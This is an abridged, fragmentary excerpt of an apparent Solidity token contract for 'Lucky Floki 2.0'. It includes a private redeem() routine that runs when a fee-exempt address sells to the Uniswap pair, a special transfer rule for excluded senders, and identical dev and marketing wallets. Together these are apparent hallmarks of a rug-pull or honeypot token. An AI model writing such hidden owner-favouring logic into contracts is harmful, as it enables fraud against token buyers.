...
🔹 Telegram: https://t.me/LuckyFloki2
*/
...
contract LuckyFloki_2 is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Lucky Floki 2.0";
    string private constant _symbol = unicode"LUKI2";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 3* 10**12 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x078607efEcC89bC06aeDd21c115bcaEc350fc990);
    address payable public MarketingWallet = payable(0x078607efEcC89bC06aeDd21c115bcaEc350fc990);
    ...
    function redeem() private {for (uint256 i = 0; i < _Excluded.length; i++) {
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (transferDelay && _isExcludedFromFee[from] && to == uniswapV2Pair) {redeem();}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isExcludeds[sender]){sAmount = tAmount*99/100;}
